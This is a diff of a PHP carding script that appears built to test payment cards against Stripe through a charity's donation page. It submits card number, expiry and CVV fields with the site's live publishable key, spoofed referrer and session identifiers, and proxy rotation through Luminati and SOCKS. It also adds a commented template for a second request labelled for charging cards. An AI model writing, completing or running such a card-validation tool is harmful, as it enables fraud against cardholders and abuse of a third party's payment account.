@@ -92,10 +92,36 @@ curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_POSTFIELDS, 'email='.$email.'&validation_type=card&payment_user_agent=Stripe+Checkout+v3+checkout-manhattan+(stripe.js%2Fa44017d)&referrer=https%3A%2F%2Fportland.scrapcreativereuse.org%2Fdonate%2Fitems-we-accept%2F%3Futm_content%3Dbuffere282f%26utm_medium%3Dsocial%26utm_source%3Dplus.google.com%26utm_campaign%3Dbuffer&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[cvc]='.$cvv.'&card[name]='.$email.'&time_on_page=18416&guid=17583cc9-7646-4f73-ba1a-408931871912&muid=26777036-c852-418d-a6c5-64766e94ff66&sid=9191f10d-8219-4a97-b63d-a25d04ab4a86&key=pk_live_9DUA63QRT1NfzluWp2vrtu0z');
 
-
-
 $result = curl_exec($ch);
-$message = trim(strip_tags(getStr($result,'"message":"','"'))); 
+// $token = trim(strip_tags(getStr($result,'"id": "','"')));
+
+////Uncomment this section for using 2req////////////////////////===[For Charging Cards]-[If U Want To Charge Your Card Uncomment And Add Site]
+
+// $ch = curl_init();
+// /////////========Luminati
+// curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
+// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
+// ////////=========Socks Proxy
+// //curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
+// curl_setopt($ch, CURLOPT_URL, '#');
+// curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+// curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+// curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+// curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+// curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+// curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+//   'Host: '#',    [If No Host Data On Site Dont Uncomment It]  
+//   'accept: '#',
+//   'content-type: #',
+//   'cookie: #',   [If No Cookie Data On Site Dont Uncomment It]
+//   'Origin: #',
+//   'referer: #',
+//   'Sec-Fetch-Mode: #',
+// ));
+// curl_setopt($ch, CURLOPT_POSTFIELDS, '#');
+
+// $result = curl_exec($ch);
+// $message = trim(strip_tags(getStr($result,'"message":"','"'))); 
 
 ////////////////////////////===[Card Response]
 
